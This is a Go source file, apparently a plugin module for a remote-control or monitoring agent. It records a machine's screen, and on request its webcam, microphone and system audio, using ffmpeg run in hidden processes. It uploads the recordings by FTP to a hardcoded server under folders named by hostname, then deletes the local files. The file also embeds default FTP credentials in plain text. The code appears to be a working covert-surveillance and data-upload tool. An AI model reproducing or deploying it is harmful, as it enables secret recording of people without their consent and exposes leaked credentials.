// screen_record.go
package scripts

import (
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// -----------------------------
// Config
// -----------------------------
const (
	ffmpegDownloadURL = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
	ffmpegFolder      = `C:\Program Files\FFmpeg\bin`
	ffmpegExePath     = ffmpegFolder + `\ffmpeg.exe`
	tempFolder        = `C:\temp`
)

// ScreenRecordData representa o resultado da gravação
type ScreenRecordData struct {
	Username              string `json:"username"`
	Hostname              string `json:"hostname"`
	VideoPath             string `json:"video_path"`
	ThumbnailPath         string `json:"video_thumb_path"`
	FTPVideoURI           string `json:"ftp_video_uri"`
	FTPThumbURI           string `json:"ftp_thumb_uri"`
	FTPDirectoryStructure string `json:"ftp_directory_structure"`
	DurationSeconds       int    `json:"duration_seconds"`
	FileSizeBytes         int64  `json:"file_size_bytes"`
	CaptureTime           string `json:"capture_time"`
	TimestampUsed         string `json:"timestamp_used"`
	FTPUploadSuccess      bool   `json:"ftp_upload_success"`
	FTPServer             string `json:"ftp_server"`
	FFmpegVersion         string `json:"ffmpeg_version"`
	RecordedCamera        bool   `json:"recorded_camera"`
	RecordedMicro         bool   `json:"recorded_micro"`
	RecordedApp           string `json:"recorded_app"`
	AudioCapabilities     string `json:"audio_capabilities"`
}

// ScreenRecordScript implementa a interface Script
type ScreenRecordScript struct {
	ftpServer string
	ftpUser   string
	ftpPass   string
}

// NewScreenRecordScript cria uma nova instância com configurações FTP
func NewScreenRecordScript(ftpServer, ftpUser, ftpPass string) *ScreenRecordScript {
	if ftpServer == "" {
		ftpServer = "172.20.29.199"
	}
	if ftpUser == "" {
		ftpUser = "steel"
	}
	if ftpPass == "" {
		ftpPass = "M7a64tl0"
	}

	return &ScreenRecordScript{
		ftpServer: ftpServer,
		ftpUser:   ftpUser,
		ftpPass:   ftpPass,
	}
}

func (s *ScreenRecordScript) Name() string {
	return "screen_record"
}

func (s *ScreenRecordScript) Execute(args ...string) ([]map[string]interface{}, error) {
	// Parse de argumentos
	if len(args) == 0 {
		return nil, errors.New("necessário informar a duração em segundos")
	}

	seconds, err := strconv.Atoi(args[0])
	if err != nil {
		return nil, fmt.Errorf("erro ao converter duração: %w", err)
	}

	if seconds <= 0 {
		return nil, errors.New("duração deve ser > 0")
	}

	// Configurações opcionais
	recordCamera := false
	recordMicro := false
	recordApp := ""

	for i := 1; i < len(args); i++ {
		switch args[i] {
		case "-RecordCamera":
			recordCamera = true
		case "-RecordMicro":
			recordMicro = true
		case "-RecordApp":
			if i+1 < len(args) {
				recordApp = args[i+1]
				i++
			}
		}
	}

	// Executa gravação
	data, err := s.recordScreen(seconds, recordCamera, recordMicro, recordApp)
	if err != nil {
		hostname, _ := os.Hostname()
		return []map[string]interface{}{
			{
				"hostname": hostname,
				"error":    err.Error(),
				"status":   "error",
			},
		}, err
	}

	// Converte para map[string]interface{}
	result := map[string]interface{}{
		"username":                data.Username,
		"hostname":                data.Hostname,
		"video_path":              data.VideoPath,
		"video_thumb_path":        data.ThumbnailPath,
		"ftp_video_uri":           data.FTPVideoURI,
		"ftp_thumb_uri":           data.FTPThumbURI,
		"ftp_directory_structure": data.FTPDirectoryStructure,
		"duration_seconds":        data.DurationSeconds,
		"file_size_bytes":         data.FileSizeBytes,
		"capture_time":            data.CaptureTime,
		"timestamp_used":          data.TimestampUsed,
		"ftp_upload_success":      data.FTPUploadSuccess,
		"ftp_server":              data.FTPServer,
		"ffmpeg_version":          data.FFmpegVersion,
		"recorded_camera":         data.RecordedCamera,
		"recorded_micro":          data.RecordedMicro,
		"recorded_app":            data.RecordedApp,
		"audio_capabilities":      data.AudioCapabilities,
	}

	return []map[string]interface{}{result}, nil
}

func (s *ScreenRecordScript) recordScreen(seconds int, recordCamera bool, recordMicro bool, recordApp string) (*ScreenRecordData, error) {
	// Obter informações do sistema
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	// Preparar pastas e ffmpeg
	if err := ensureDir(tempFolder); err != nil {
		return nil, fmt.Errorf("erro criando temp: %w", err)
	}
	if err := ensureFFmpeg(); err != nil {
		return nil, fmt.Errorf("erro preparando ffmpeg: %w", err)
	}

	// Verificar capacidades de áudio antes de iniciar
	capabilities := s.checkAudioCapabilities()
	audioCapabilitiesStr := s.formatAudioCapabilities(capabilities)

	// Gerar timestamp e caminhos
	timestamp := time.Now().Format("2006-01-02_15-04-05")
	videoPath := filepath.Join(tempFolder, fmt.Sprintf("screen_record_%s.mp4", timestamp))
	thumbPath := filepath.Join(tempFolder, fmt.Sprintf("screen_record_%s_thumb.png", timestamp))

	// Construir comando FFmpeg
	ffArgs, err := s.buildFFmpegArgs(seconds, videoPath, recordCamera, recordMicro, recordApp)
	if err != nil {
		return nil, fmt.Errorf("erro construindo argumentos FFmpeg: %w", err)
	}

	// Gravar
	fmt.Println("🎬 Iniciando gravação...")
	cmd := hiddenCmd(ffmpegExePath, ffArgs...)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("ffmpeg erro: %w", err)
	}
	fmt.Println("✅ Gravação concluída!")

	// Confirmar que arquivo foi criado
	stat, err := os.Stat(videoPath)
	if err != nil {
		return nil, fmt.Errorf("arquivo de vídeo não encontrado: %w", err)
	}

	// Gerar thumbnail
	fmt.Println("📸 Gerando miniatura...")
	thumbTime := 1
	if seconds <= 2 {
		thumbTime = seconds / 2
	}
	thumbArgs := []string{"-y", "-ss", fmt.Sprint(thumbTime), "-i", videoPath, "-frames:v", "1", "-vf", "scale=iw*0.3:ih*0.3", thumbPath}
	cmd2 := hiddenCmd(ffmpegExePath, thumbArgs...)
	cmd2.Stdout = nil
	cmd2.Stderr = nil
	_ = cmd2.Run()

	// FTP: criar diretórios
	fmt.Println("📤 Preparando upload FTP...")
	baseDirPath := "/ftp/"
	hostDirPath := fmt.Sprintf("/ftp/%s/", hostname)

	_ = ftpMakeDirIfNotExists(s.ftpServer, s.ftpUser, s.ftpPass, baseDirPath)
	_ = ftpMakeDirIfNotExists(s.ftpServer, s.ftpUser, s.ftpPass, hostDirPath)

	// Gerar nomes únicos
	finalTimestamp := timestamp
	var videoRemotePath, thumbRemotePath string
	for i := 1; i <= 100; i++ {
		videoRemotePath = fmt.Sprintf("/ftp/%s/screen_record_%s.mp4", hostname, finalTimestamp)
		thumbRemotePath = fmt.Sprintf("/ftp/%s/screen_record_%s_thumb.png", hostname, finalTimestamp)
		existsV, _ := ftpFileExists(s.ftpServer, s.ftpUser, s.ftpPass, videoRemotePath)
		existsT, _ := ftpFileExists(s.ftpServer, s.ftpUser, s.ftpPass, thumbRemotePath)
		if !existsV && !existsT {
			break
		}
		finalTimestamp = fmt.Sprintf("%s_%d", timestamp, i)
		if i == 100 {
			return nil, errors.New("não foi possível gerar nome único após 100 tentativas")
		}
	}

	// Ler arquivos locais
	videoBytes, err := ioutil.ReadFile(videoPath)
	if err != nil {
		return nil, fmt.Errorf("erro lendo vídeo local: %w", err)
	}

	var thumbBytes []byte
	if fileExists(thumbPath) {
		thumbBytes, _ = ioutil.ReadFile(thumbPath)
	}

	// Upload para FTP
	fmt.Println("⬆️  Enviando para servidor FTP...")
	err1 := ftpUploadFile(s.ftpServer, s.ftpUser, s.ftpPass, videoRemotePath, videoBytes)
	err2 := error(nil)
	if len(thumbBytes) > 0 {
		err2 = ftpUploadFile(s.ftpServer, s.ftpUser, s.ftpPass, thumbRemotePath, thumbBytes)
	}

	uploadSuccess := (err1 == nil && err2 == nil)
	if uploadSuccess {
		fmt.Println("✅ Upload concluído com sucesso!")
	} else {
		fmt.Println("⚠️  Falha no upload FTP")
	}

	// Criar resultado
	data := &ScreenRecordData{
		Username:              username,
		Hostname:              hostname,
		VideoPath:             videoPath,
		ThumbnailPath:         thumbPath,
		FTPVideoURI:           fmt.Sprintf("ftp://%s%s", s.ftpServer, videoRemotePath),
		FTPThumbURI:           fmt.Sprintf("ftp://%s%s", s.ftpServer, thumbRemotePath),
		FTPDirectoryStructure: fmt.Sprintf("/ftp/%s/", hostname),
		DurationSeconds:       seconds,
		FileSizeBytes:         stat.Size(),
		CaptureTime:           time.Now().Format("2006-01-02T15:04:05"),
		TimestampUsed:         finalTimestamp,
		FTPUploadSuccess:      uploadSuccess,
		FTPServer:             s.ftpServer,
		FFmpegVersion:         "Auto-downloaded-or-local",
		RecordedCamera:        recordCamera,
		RecordedMicro:         recordMicro,
		RecordedApp:           recordApp,
		AudioCapabilities:     audioCapabilitiesStr,
	}

	// Remover arquivos locais se upload ok
	if uploadSuccess {
		_ = os.Remove(videoPath)
		_ = os.Remove(thumbPath)
	}

	return data, nil
}

// buildFFmpegArgs constrói os argumentos do FFmpeg baseado nas configurações
func (s *ScreenRecordScript) buildFFmpegArgs(seconds int, outputPath string, recordCamera bool, recordMicro bool, recordApp string) ([]string, error) {
	args := []string{"-y"}
	inputCount := 0
	filterParts := []string{}
	audioInputs := []string{}

	fmt.Println("\n╔══════════════════════════════════════╗")
	fmt.Println("║   CONFIGURAÇÃO DE GRAVAÇÃO           ║")
	fmt.Println("╚══════════════════════════════════════╝")

	// === CAPTURA DE TELA ===
	if recordApp != "" && recordApp != "0" {
		args = append(args,
			"-f", "gdigrab",
			"-framerate", "20",
			"-t", fmt.Sprint(seconds),
			"-i", fmt.Sprintf("title=%s", recordApp),
		)
		fmt.Printf("📹 Captura: Aplicativo '%s'\n", recordApp)
	} else {
		args = append(args,
			"-f", "gdigrab",
			"-framerate", "20",
			"-t", fmt.Sprint(seconds),
			"-i", "desktop",
		)
		fmt.Println("📹 Captura: Desktop completo")
	}
	inputCount++

	// === CAPTURA DE CÂMERA ===
	if recordCamera {
		videoDevice, err := s.detectVideoDevice()
		if err == nil && videoDevice != "" {
			args = append(args,
				"-f", "dshow",
				"-framerate", "30",
				"-video_size", "640x480",
				"-i", fmt.Sprintf("video=%s", videoDevice),
			)
			inputCount++
			filterParts = append(filterParts, fmt.Sprintf("[1:v]scale=320:240[cam];[0:v][cam]overlay=W-w-10:H-h-10"))
			fmt.Printf("📷 Câmera: %s ✓\n", videoDevice)
		} else {
			fmt.Println("📷 Câmera: Não detectada ✗")
		}
	}

	// === CAPTURA DE ÁUDIO ===
	if recordMicro {
		micFound := false
		systemAudioFound := false

		// Microfone (entrada)
		micDevice, err := s.detectAudioInputDevice()
		if err == nil && micDevice != "" {
			args = append(args,
				"-f", "dshow",
				"-i", fmt.Sprintf("audio=%s", micDevice),
			)
			audioInputs = append(audioInputs, fmt.Sprintf("[%d:a]", inputCount))
			inputCount++
			micFound = true
			fmt.Printf("🎤 Microfone: %s ✓\n", micDevice)
		} else {
			fmt.Println("🎤 Microfone: Não detectado ✗")
		}

		// Áudio do sistema (saída/loopback)
		speakerDevice, err := s.detectAudioOutputDevice()
		if err == nil && speakerDevice != "" {
			args = append(args,
				"-f", "dshow",
				"-i", fmt.Sprintf("audio=%s", speakerDevice),
			)
			audioInputs = append(audioInputs, fmt.Sprintf("[%d:a]", inputCount))
			inputCount++
			systemAudioFound = true
			fmt.Printf("🔊 Áudio Sistema: %s ✓\n", speakerDevice)
		} else {
			fmt.Println("🔊 Áudio Sistema: Não disponível ✗")
			fmt.Println("   ╰─> 💡 Para capturar áudio do sistema:")
			fmt.Println("       • Habilite 'Stereo Mix' nas configurações de som")
			fmt.Println("       • Ou instale VB-Cable: https://vb-audio.com/Cable/")
		}

		// Aviso se nenhum áudio
		if !micFound && !systemAudioFound {
			fmt.Println("⚠️  AVISO: Gravando SEM ÁUDIO (nenhum dispositivo disponível)")
		} else if micFound && !systemAudioFound {
			fmt.Println("⚠️  AVISO: Gravando apenas MICROFONE (sem áudio do sistema)")
		}
	}

	// === FILTROS DE VÍDEO ===
	if len(filterParts) > 0 {
		args = append(args, "-filter_complex", strings.Join(filterParts, ";"))
	}

	// === MIXAGEM DE ÁUDIO ===
	if len(audioInputs) > 1 {
		// Mixa todas as fontes de áudio
		audioFilter := fmt.Sprintf("%samix=inputs=%d:duration=longest", strings.Join(audioInputs, ""), len(audioInputs))
		args = append(args, "-filter_complex", audioFilter)
		fmt.Printf("🎵 Mixando %d fontes de áudio\n", len(audioInputs))
	} else if len(audioInputs) == 1 {
		// Apenas uma fonte - mapeia diretamente
		args = append(args, "-map", "0:v", "-map", strings.Trim(audioInputs[0], "[]"))
		fmt.Println("🎵 Gravando 1 fonte de áudio")
	}

	// === CONFIGURAÇÕES DE CODIFICAÇÃO ===
	args = append(args,
		"-c:v", "libx264",
		"-preset", "ultrafast",
		"-crf", "18",
		"-pix_fmt", "yuv420p",
	)

	if len(audioInputs) > 0 {
		args = append(args,
			"-c:a", "aac",
			"-b:a", "192k",
		)
	}

	args = append(args, outputPath)

	fmt.Printf("⏱️  Duração: %d segundos\n", seconds)
	fmt.Println("╚══════════════════════════════════════╝\n")

	return args, nil
}

// detectVideoDevice detecta o dispositivo de câmera disponível
func (s *ScreenRecordScript) detectVideoDevice() (string, error) {
	cmd := hiddenCmd(ffmpegExePath, "-list_devices", "true", "-f", "dshow", "-i", "dummy")
	output, _ := cmd.CombinedOutput()

	lines := strings.Split(string(output), "\n")
	inVideoSection := false

	for i, line := range lines {
		if strings.Contains(line, "DirectShow video devices") {
			inVideoSection = true
			continue
		}

		if inVideoSection && strings.Contains(line, "DirectShow audio devices") {
			break
		}

		if inVideoSection && strings.HasPrefix(strings.TrimSpace(line), "\"") {
			deviceLine := strings.TrimSpace(line)
			start := strings.Index(deviceLine, "\"")
			end := strings.Index(deviceLine[start+1:], "\"")
			if end > 0 {
				deviceName := deviceLine[start+1 : start+1+end]
				// Ignora "Alternative name"
				if i+1 < len(lines) && !strings.Contains(lines[i+1], "Alternative name") {
					return deviceName, nil
				}
				return deviceName, nil
			}
		}
	}

	return "", errors.New("nenhum dispositivo de vídeo encontrado")
}

// detectAudioInputDevice detecta o dispositivo de microfone
func (s *ScreenRecordScript) detectAudioInputDevice() (string, error) {
	cmd := hiddenCmd(ffmpegExePath, "-list_devices", "true", "-f", "dshow", "-i", "dummy")
	output, _ := cmd.CombinedOutput()

	lines := strings.Split(string(output), "\n")
	inAudioSection := false

	// Nomes a evitar (não são microfones)
	avoidNames := []string{
		"stereo mix", "mixagem", "loopback", "cable output",
		"what u hear", "wave out", "rec. playback",
	}

	for _, line := range lines {
		if strings.Contains(line, "DirectShow audio devices") {
			inAudioSection = true
			continue
		}

		if inAudioSection && strings.Contains(line, "Alternative name") {
			continue
		}

		if inAudioSection && strings.HasPrefix(strings.TrimSpace(line), "\"") {
			deviceLine := strings.TrimSpace(line)
			start := strings.Index(deviceLine, "\"")
			end := strings.Index(deviceLine[start+1:], "\"")
			if end > 0 {
				deviceName := deviceLine[start+1 : start+1+end]
				deviceLower := strings.ToLower(deviceName)

				// Verifica se não é um dispositivo de loopback
				isLoopback := false
				for _, avoid := range avoidNames {
					if strings.Contains(deviceLower, avoid) {
						isLoopback = true
						break
					}
				}

				if !isLoopback {
					return deviceName, nil
				}
			}
		}

		if inAudioSection && strings.Contains(line, "]:") {
			break
		}
	}

	return "", errors.New("nenhum dispositivo de áudio de entrada encontrado")
}

// detectAudioOutputDevice detecta o dispositivo de áudio do sistema (loopback)
func (s *ScreenRecordScript) detectAudioOutputDevice() (string, error) {
	cmd := hiddenCmd(ffmpegExePath, "-list_devices", "true", "-f", "dshow", "-i", "dummy")
	output, _ := cmd.CombinedOutput()

	lines := strings.Split(string(output), "\n")
	inAudioSection := false

	// Nomes possíveis de Stereo Mix e VB-Cable (multi-idioma)
	loopbackNames := []string{
		"stereo mix",
		"mixagem estéreo",
		"mixagem estereo",
		"what u hear",
		"wave out mix",
		"loopback",
		"rec. playback",
		"wave out",
		"cable output",
		"vb-cable",
		"vb cable",
		"screencapturer",
	}

	var allDevices []string

	for _, line := range lines {
		if strings.Contains(line, "DirectShow audio devices") {
			inAudioSection = true
			continue
		}

		if inAudioSection && strings.HasPrefix(strings.TrimSpace(line), "\"") {
			deviceLine := strings.TrimSpace(line)
			start := strings.Index(deviceLine, "\"")
			end := strings.Index(deviceLine[start+1:], "\"")
			if end > 0 {
				deviceName := deviceLine[start+1 : start+1+end]
				allDevices = append(allDevices, deviceName)

				// Verifica se é dispositivo de loopback
				deviceLower := strings.ToLower(deviceName)
				for _, loopback := range loopbackNames {
					if strings.Contains(deviceLower, loopback) {
						return deviceName, nil
					}
				}
			}
		}

		if inAudioSection && strings.Contains(line, "]:") {
			break
		}
	}

	// Retorna erro detalhado com dispositivos encontrados
	if len(allDevices) > 0 {
		return "", fmt.Errorf("stereo Mix/VB-Cable não encontrado (dispositivos detectados: %s)", strings.Join(allDevices, ", "))
	}

	return "", errors.New("nenhum dispositivo de áudio encontrado")
}

// checkAudioCapabilities verifica capacidades de áudio do sistema
func (s *ScreenRecordScript) checkAudioCapabilities() map[string]bool {
	capabilities := map[string]bool{
		"microphone":   false,
		"system_audio": false,
		"camera":       false,
	}

	if _, err := s.detectAudioInputDevice(); err == nil {
		capabilities["microphone"] = true
	}

	if _, err := s.detectAudioOutputDevice(); err == nil {
		capabilities["system_audio"] = true
	}

	if _, err := s.detectVideoDevice(); err == nil {
		capabilities["camera"] = true
	}

	return capabilities
}

// formatAudioCapabilities formata as capacidades para string
func (s *ScreenRecordScript) formatAudioCapabilities(caps map[string]bool) string {
	parts := []string{}

	if caps["microphone"] {
		parts = append(parts, "Microphone:YES")
	} else {
		parts = append(parts, "Microphone:NO")
	}

	if caps["system_audio"] {
		parts = append(parts, "SystemAudio:YES")
	} else {
		parts = append(parts, "SystemAudio:NO")
	}

	if caps["camera"] {
		parts = append(parts, "Camera:YES")
	} else {
		parts = append(parts, "Camera:NO")
	}

	return strings.Join(parts, " | ")
}

// -----------------------------
// Helpers
// -----------------------------
func ensureDir(path string) error {
	return os.MkdirAll(path, 0755)
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func downloadFile(urlStr, dest string) error {
	resp, err := http.Get(urlStr)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("download failed: %s", resp.Status)
	}

	out, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func runPowershellExpand(zipPath, dest string) error {
	cmd := hiddenCmd("powershell", "-NoProfile", "-Command", "Expand-Archive", "-LiteralPath", zipPath, "-DestinationPath", dest, "-Force")
	return cmd.Run()
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return out.Sync()
}

// -----------------------------
// FFmpeg auto-install
// -----------------------------
func ensureFFmpeg() error {
	if fileExists(ffmpegExePath) {
		return nil
	}

	fmt.Println("📦 FFmpeg não encontrado. Iniciando download automático...")

	if err := ensureDir(tempFolder); err != nil {
		return err
	}
	if err := ensureDir(ffmpegFolder); err != nil {
		return err
	}

	zipPath := filepath.Join(tempFolder, "ffmpeg.zip")
	extractPath := filepath.Join(tempFolder, "ffmpeg_extracted")

	if err := downloadFile(ffmpegDownloadURL, zipPath); err != nil {
		return fmt.Errorf("erro ao baixar ffmpeg: %w", err)
	}
	fmt.Println("✓ Download concluído")

	if err := runPowershellExpand(zipPath, extractPath); err != nil {
		return fmt.Errorf("erro ao extrair ffmpeg: %w", err)
	}
	fmt.Println("✓ Extração concluída")

	// procurar ffmpeg.exe extraído
	var found string
	filepath.Walk(extractPath, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() && strings.EqualFold(info.Name(), "ffmpeg.exe") {
			found = path
			return io.EOF
		}
		return nil
	})

	if found == "" {
		return errors.New("ffmpeg.exe não encontrado no pacote extraído")
	}

	if err := copyFile(found, ffmpegExePath); err != nil {
		return fmt.Errorf("erro copiando ffmpeg.exe: %w", err)
	}

	fmt.Println("✅ FFmpeg instalado com sucesso!")
	return nil
}
